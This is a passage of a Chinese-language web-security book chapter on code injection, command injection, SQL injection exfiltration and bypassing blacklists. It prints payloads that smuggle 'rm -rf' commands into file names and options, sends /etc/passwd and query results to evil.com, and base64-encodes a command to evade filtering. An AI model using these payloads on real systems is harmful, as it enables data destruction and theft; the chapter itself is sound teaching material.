

## 代码注入

在注入世界中，SQL 注入只是“注入”式攻击的一个子集。SQL 注入被归类为注入，因为它涉及一个解释器（SQL 解释器）被载荷攻击，该载荷由于不当的清理而被读入解释器，而清理本应只允许用户的特定参数被读入解释器。由于缺乏清理，由 API 端点调用的 CLI 被提供了额外的意外命令（见图 13-2）。这些命令针对 CLI 执行。

> **图 13-2. CLI 注入**

SQL 注入首先是一种注入攻击，其次是一种代码注入攻击。这是因为在注入攻击中运行的脚本是在解释器或 CLI 下运行的，而不是针对主机操作系统（命令注入）。

如前所述，还有许多较少为人知的代码注入风格不依赖数据库。这些不常见的原因有几个。首先，如今几乎每个复杂的 Web 应用都依赖数据库来存储和检索用户数据。因此，您更可能发现 SQL 或其他数据库注入，而不是针对服务器上较少使用的 CLI 的注入。

此外，通过注入利用 SQL 数据库的知识非常普遍，SQL 注入攻击易于研究。您可以在互联网上快速搜索几次，就能找到足够阅读数小时（甚至数天）的 SQL 注入资料。

其他形式的代码注入更难研究，不是因为它们更少见（确实少见，但我认为这不是文档较少的原因），而是因为代码注入通常是应用特定的。换句话说，几乎每个 Web 应用都会使用数据库（通常是某种 SQL），但并非每个 Web 应用都会使用可以通过 API 端点控制的其他 CLI/解释器。

让我们考虑 MegaBank 为其面向客户的营销活动分配的一个图像/视频压缩服务器。该服务器是位于 `https://media.mega-bank.com` 的一组 REST API。特别是，它包含几个有趣的 API：

- `uploadImage`（POST）
- `uploadVideo`（POST）
- `getImage`（GET）
- `getVideo`（GET）

端点 `uploadImage()` 是一个简单的 Node.js 端点，看起来像这样：

```javascript
const imagemin = require('imagemin');
const imageminJpegtran = require('imagemin-jpegtran');
const fs = require('fs');

/*
 * 尝试将用户提供的图像上传到服务器。
 *
 * 使用 imagemin 进行图像压缩，以减少对服务器硬盘空间的影响。
 */
app.post('/uploadImage', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  /*
   * 将原始图像写入磁盘。
   */
  fs.writeFileSync(`/images/raw/${req.body.name}.png`, req.body.image);

  /*
   * 压缩原始图像，生成优化后的图像，占用更少磁盘空间。
   */
  const compressImage = async function() {
    const res = await imagemin([`/images/raw/${req.body.name}.png`],
                               `/images/compressed/${req.body.name}.jpg`);
    return res;
  };

  /*
   * 压缩请求者提供的图像，压缩完成后继续脚本执行。
   */
  const res = await compressImage();

  /*
   * 向客户端返回压缩图像的链接。
   */
  return res.status(200)
            .json({url: `https://media.mega-bank.com/images/${req.body.name}.jpg` });
});
```

这是一个非常简单的端点，将 PNG 图像转换为 JPG。它使用 imagemin 库来实现，并且除了文件名外，不接受用户的任何参数来确定压缩类型。

然而，一个用户可能利用文件名重复，导致 imagemin 库覆盖现有图像。这就是大多数操作系统上文件名的特性：

```html
<!-- 在 https://www.mega-bank.com 首页上 -->
<html>
  <!-- 其他标签 -->
  <img src="https://media.mega-bank.com/images/main_logo.png">
  <!-- 其他标签 -->
</html>
```

```javascript
const name = 'main_logo.png';
// 使用 req.body.name = main_logo.png 调用 uploadImage POST
```

这看起来不像注入攻击，因为它只是一个转换和保存图像的 JavaScript 库。事实上，它看起来只是一个编写不佳的 API 端点，没有考虑名称冲突的边缘情况。然而，由于 imagemin 库调用了一个 CLI（`imagemin-cli`），这实际上会是一个注入攻击——利用附加到 API 的未适当清理的 CLI 执行非预期操作。

不过这是一个非常简单的例子，除了当前情况外，没有太多可利用性。让我们看一个 SQL 领域之外的更详细的代码注入示例：

```javascript
const exec = require('child_process').exec;
const converter = require('converter');
const defaultOptions = '-s 1280x720';

/*
 * 尝试上传 HTTP POST 发起者提供的视频。
 *
 * 降低视频分辨率以获得更好的流媒体兼容性；
 * 这是通过一个名为 `converter` 的库完成的。
 */
app.post('/uploadVideo', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  // 从 HTTP 请求体收集数据
  const videoData = req.body.video;
  const videoName = req.body.name;
  const options = defaultOptions + req.body.options;

  exec(`convert -d ${videoData} -n ${videoName} -o ${options}`);
});
```

假设这个虚构的转换器库在其自身上下文中运行 CLI，类似于许多 Unix 工具。换句话说，在运行命令 `convert` 后，执行器的作用域现在限定为转换器提供的命令，而非主机 OS 提供的命令。

在我们的案例中，用户可以轻松提供有效输入——也许压缩类型和音频比特率。这些可能如下：

```javascript
const options = '-c h264 -ab 192k';
```

另一方面，他们可能能够根据 CLI 的结构调用附加命令：

```javascript
const options = '-c h264 -ab 192k \\ convert -dir /videos -s 1x1';
```

如何向 CLI 注入附加命令取决于 CLI 的架构。有些 CLI 支持在一行上使用多个命令，而另一些则不支持。许多 CLI 会被换行符、空格或与符号（`&&`）分割。

在本例中，我们使用换行符向转换器 CLI 添加了附加语句。这不是开发者的预期用例，因为附加语句允许我们重定向转换器 CLI 并对不属于我们的视频进行修改。

如果此 CLI 直接针对主机 OS 运行，而非在自身隔离环境中运行，那么我们就会拥有命令注入而非代码注入。想象以下情况：

```bash
$ convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720'
```

此命令在 Bash 中通过 Unix OS 终端运行，正如大多数压缩软件的运行方式。

考虑以下引号被逃逸的情况，允许命令直接针对主机 OS 运行，而非通过 `convert` 工具传递：

```javascript
const options = "' && rm -rf /videos";
```

由于使用了撇号（`'`）来打破 `options` 字符串，我们现在遇到了更危险的注入形式，导致以下命令针对主机 OS 运行：

```bash
$ convert -d vidData.mp4 -n myVid.mp4 -o '-s 1280x720' && rm -rf /videos
```

代码注入仅限于解释器或 CLI，而命令注入则暴露了整个操作系统。

在脚本和系统级命令之间插值时，必须注意在针对主机 OS（Linux、Macintosh、Windows 等）或解释器（SQL、CLI 等）执行之前，字符串是如何被清理的，以防止命令注入和代码注入。

## 命令注入

在命令注入中，API 端点生成 Bash 命令，包括来自客户端的请求。恶意用户添加自定义命令，修改 API 端点的正常操作（见图 13-3）。

我在上一节中使用视频转换器引入 CLI 示例的原因是为了更容易过渡到命令注入。到目前为止，我们已经了解到代码注入涉及利用编写不当的 API，使解释器或 CLI 执行开发者未意图的操作。我们还了解到，命令注入是代码注入的升级形式，我们不是对 CLI 或解释器执行非预期操作，而是对操作系统执行非预期操作。

> **图 13-3. 命令注入**

让我们后退一步，考虑此级别攻击的后果。首先，能够对基于 Unix 的 OS（Macintosh 或 Linux）执行命令（通常是 Bash）具有非常严重的风险。如果我们直接访问主机 Unix OS（超过 95% 的服务器基于 Unix），并且我们的命令被解释为超级用户，我们可以对该操作系统为所欲为。

受感染的 OS 使黑客能够访问许多非常关键的文件和权限，例如：

- `/etc/passwd`：跟踪 OS 上的每个用户账户
- `/etc/shadow`：包含用户的加密密码
- `~/.ssh`：包含用于与其他系统通信的 SSH 密钥
- `/etc/apache2/httpd.conf`：基于 Apache 的服务器的配置
- `/etc/nginx/nginx.conf`：基于 Nginx 的服务器的配置

此外，命令注入可能不仅给予我们读取权限，还可能给予我们对这些文件的写入权限。

像这样的漏洞打开了一整套潜在攻击，我们可以利用命令注入造成比预期更大的破坏，包括：

- 从服务器窃取数据（显而易见）。
- 重写日志文件以隐藏我们的踪迹。
- 添加具有写入权限的额外数据库用户以备后用。
- 删除服务器上的重要文件。
- 擦除服务器并使其瘫痪。
- 利用与其他服务器/API 的集成（例如，使用服务器的 Sendgrid 密钥发送垃圾邮件）。
- 将 Web 应用中的单个登录表单更改为向我们的网站发送未加密密码的网络钓鱼表单。
- 锁定管理员并将其置于勒索之下。

如您所见，命令注入是黑客工具包中最危险的攻击类型之一。它位于每个漏洞风险评级的最顶端，并且在未来很长一段时间内都将如此，即使现代 Web 服务器上已有缓解措施。

基于 Unix 的操作系统上的缓解措施之一是强大的权限系统，它可以通过减少受损端点可能造成的损害来降低部分风险。基于 Unix 的操作系统允许对文件、目录、用户和命令应用详细权限。正确设置这些权限可以强制 API 以非特权用户身份运行，从而潜在地消除前述许多威胁的风险。不幸的是，大多数面临命令注入风险的应用并未采取这些步骤为其代码创建高级用户权限配置文件。

让我们通过另一个快速示例来看命令注入有多么简单：

```javascript
const exec = require('child_process').exec;
const fs = require('fs');
const safe_converter = require('safe_converter');

/*
 * 上传要存储在服务器上的视频。
 *
 * 使用 `safe_converter` 库转换原始视频，
 * 然后从磁盘中删除原始视频，并向请求者返回 HTTP 200 状态码。
 */
app.post('/uploadVideo', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  /*
   * 将原始视频数据写入磁盘，稍后可以压缩并从磁盘中删除。
   */
  fs.writeFileSync(`/videos/raw/${req.body.name}`, req.body.video);

  /*
   * 转换原始、未优化的视频——生成优化后的视频。
   */
  safe_converter.convert(`/videos/raw/${req.body.name}`,
                         `/videos/converted/${req.body.name}`)
    .then(() => {
      /*
       * 当不再需要原始视频文件时删除它。
       * 保留优化后的视频文件。
       */
      exec(`rm /videos/raw/${req.body.name}`);
      return res.sendStatus(200);
    });
});
```

此示例中有几个操作：

1. 我们将视频数据写入磁盘的 `/videos/raw` 目录。
2. 我们转换原始视频文件，将输出写入 `/videos/converted`。
3. 我们删除原始视频（不再需要）。

这是一个非常典型的压缩工作流程。然而，在此示例中，删除原始视频文件的那行 `exec(\`rm /videos/raw/${req.body.name}\`);` 依赖于未清理的用户输入来确定要删除的视频文件名。

此外，该名称不是参数化的，而是作为字符串拼接到 Bash 命令中。这意味着在视频被删除后，可能存在附加命令。让我们评估一个可能导致此情况的场景：

```javascript
// 要在 POST 请求中发送的名称
const name = 'myVideo.mp4 && rm -rf /videos/converted/';
```

与“代码注入”一节中的最后一个示例类似，这里未经适当清理的输入可能导致针对主机 OS 执行附加命令——因此称为“命令注入”。

## 注入数据泄露技术

在本节中，所有示例都是 SQL 注入攻击，但这些概念适用于任何形式的注入攻击。带内、带外和推断/盲数据泄露技术适用于所有形式的注入，尽管最常用于 SQL 注入。

### 数据泄露基础

与 XXE 攻击类似，可能存在攻击者能够发现并利用服务器上的 SQL 注入漏洞，但无法从服务器获得任何响应的情况。在这些情况下，继续攻击链可能很困难，因为攻击者通常要么不知道 SQL 注入是否成功，要么知道 SQL 注入成功但不知道如何利用该 SQL 注入漏洞来获取任何信息或优势。

在这些情况下，可以使用数据泄露技术来洞察远程服务器上注入攻击的状态（以及 SQL 注入响应）。

### 带内数据泄露

这是前述场景不适用时最简单、最常见的情况。您（攻击者）尝试利用 SQL 注入漏洞。服务器执行您的 SQL 载荷，响应直接在您的 Web 浏览器或 HTTP 响应中可见。在这种情况下，不需要复杂的技术来洞察 SQL 载荷的执行结果。

考虑以下 SQL 注入载荷：

```javascript
const payload = `user_id=1or1="select * from users"`;
const url = `https://megabank.com/update?${payload}`;
updateUser(url, (result) => {
  // 记录 SQL 注入的结果
  console.log(result);
});
```

如上述示例的 SQL 注入攻击被认为是“带内”的，因为载荷执行的结果可以通过用于将载荷发送到服务器的相同机制查看。

### 带外数据泄露

在 SQL 注入的结果未直接在浏览器中反映或未在 HTTP 响应中返回的情况下，可以使用带外数据泄露技术来查看在目标服务器上执行的 SQL 载荷的结果。

考虑以下 SQL 注入载荷：

```javascript
const payload = `UTIL_HTTP.request('https://evil.com',
                "user_id=1or1='select * from users'")`;
const url = `https://megabank.com/update?${payload}`;
updateUser(url, (result) => {
  // 没有显示任何内容，服务器不反映 SQL 结果
  console.log(result);
});
```

前述场景称为带外 SQL 注入（OOB SQLi）数据泄露。此示例使用了所有主流 SQL 数据库都以某种形式包含的 `util_http` 函数。这些工具函数用于在 SQL 解释器执行过程中发起 HTTP 请求，在本例中，用于将 SQL 注入载荷执行的结果发送到攻击者拥有的服务器 `https://evil.com`。

此注入攻击的结果不会像带内攻击那样反映给攻击者。然而，由于像在攻击过程中调用 HTTP 请求这样的 OOB 技术，数据仍然可以被泄露。

请注意，在多个主流数据库上，包括 Oracle SQL Server、MySQL、PostgreSQL 和 Microsoft SQL Server，都可以通过 HTTP OOB 泄露数据。不同数据库的语法有所不同，但数据泄露的工作流程大致相同。

### 推断数据泄露（盲注入）

如果既不能使用带内技术也不能使用带外技术通过 SQL 注入泄露数据，该怎么办？这种情况通常发生在于 SQL 解释器授予的权限受限，以防止前述 OOB SQL 注入攻击等攻击。

然而，无法使用带内或带外泄露并不意味着不可能泄露数据。只要 SQL 注入载荷在 SQL 解释器中成功执行，数据仍然可能被泄露——尽管需要更多努力。

一种无需带内或带外技术的数据泄露方法是推断数据泄露。通常这种类型的数据泄露用于称为盲注入的攻击，或带内和带外数据泄露都不起作用的攻击。

使用盲 SQL 注入，您不会收到任何包含 SQL 查询结果的响应，但您可能能够强制服务器表现出异常行为，从而让您洞察攻击是否成功。一种常见的方法是生成一个导致服务器抛出错误、可测量地变慢或崩溃的 SQL 注入载荷。

通过盲 SQL 注入测试结果的一种简单方法是使用 SQL 的 `WAITFOR DELAY` 操作。`WAITFOR DELAY` 是一个标准 SQL 函数，它会阻塞 SQL 解释器的执行，直到满足某个条件。考虑以下示例：

```javascript
const payload = `user_id=1or1=WAITFOR DELAY '0:0:30'`;
const url = `https://megabank.com/update?${payload}`;
updateUser(url, (result) => {
  // 没有显示任何内容，但响应延迟了 30 秒
  console.log(result);
});
```

如果此载荷成功，SQL 解释器将暂停执行 30 秒。我们可以使用浏览器开发者工具等工具来确定查询响应的时长，即使它不包含信息泄露。如果响应耗时超过 30 秒（这在 99.99% 的 SQL 查询中是不典型的），我们就知道 SQL 载荷成功的概率非常高。

然后，我们可以在未来的 SQL 查询载荷中使用分支逻辑来推断服务器和数据的信息，如果我们的查询为 `true`，则告诉服务器延迟；如果查询返回 `false`，则不延迟。虽然耗时，但像延迟技术这样的推断技术允许 SQL 注入载荷即使没有在响应中反映数据或无法带外泄露数据，也能向我们（攻击者）泄露信息。

## 绕过常见防御

现代安全的 Web 应用通常会使用非常强大和有效的 SQL 注入缓解措施，如预编译语句和存储过程。然而，许多非 SQL CLI 工具尚未内置这些高级防御。因此，开发者诉诸于效果较差的缓解形式——大多数都可以被绕过。

防御注入攻击最常见的形式之一是黑名单。尽管黑名单很流行，但实际上很容易被绕过。原因有几个，但主要是因为规范会变化，且输入可以被掩盖，使得黑名单过滤代码无法检测到输入。

注入攻击依赖于两个主要因素：载荷和执行该载荷的解释器。黑名单只排除某些关键字、短语或字符串，防止它们被传递到解释器中执行。但通常可以用解释器仍能理解的不同方式描述相同的逻辑。

考虑一个情况，CLI 具有黑名单逻辑，阻止以下载荷执行：

```bash
mail -s "leaked file" "email@evil.com" < /etc/passwd
```

此注入攻击依赖 Linux 终端，并使用其 `mail` 命令将敏感文件发送到攻击者的 Web 服务器。但如果 `mail` 命令被应用级黑名单阻止，如何重新设计载荷使其包含相同逻辑但不会被黑名单过滤系统检测到？

事实证明，基于 Linux 的操作系统终端接受并执行多种编码，包括 base64。由于黑名单过滤系统评估纯文本以尝试阻止 `mail` 命令，将载荷转换为 base64 可能使其在未被检测的情况下溜过过滤代码。

首先，以 base64 编码原始载荷（这可以在 Chrome 开发者控制台中轻松完成）：

```javascript
const b64 = btoa('mail -s "leaked file" "email@evil.com" < /etc/passwd');
console.log(b64);
// bWFpbCAtcyAibGVha2VkIGZpbGUiICJlbWFpbEBldmlsLmNvbSIgPCAvZXRjL3Bhc3N3ZA==
```

接下来，将 base64 载荷输入到被服务端过滤阻止的原始注入攻击中：

```bash
base64 -D <<< bWFpbCAtcyAibGVha2VkIGZpbGUiICJlbWFpbEBldmlsLmNvbSIgPCAvZXRjL3Bhc3N3ZA== | sh
```

由于服务端过滤黑名单只支持纯文本评估，载荷不会被阻止。在它通过 API 黑名单并进入 Linux 终端时，内置的 base64 解码工具会在将其管道传输到 Bash 并执行之前将字符串转换回纯文本。这是一个典型的例子，说明为什么黑名单与白名单相比是一种非常差的安全机制。

## 小结

注入式攻击不仅限于常见的 SQL 注入，还涉及许多其他技术。与 XXE 攻击不同，注入式攻击不是特定弱规范的结果，而是当用户输入被过度信任时出现的一类漏洞。作为漏洞赏金猎人或渗透测试员，掌握注入攻击非常有益，因为虽然知名数据库可能设置了防御措施，但针对解析器和 CLI 的注入攻击文档较少，且可能具有较不严格的防御机制。

注入攻击需要对应用的功能有一定了解，因为它们通常源于服务器代码的执行，而该代码包含从客户端 HTTP 请求中解析的文本。这些攻击强大、优雅，能够实现许多目标——无论是数据盗窃、账户接管、权限提升，还是仅仅制造混乱。
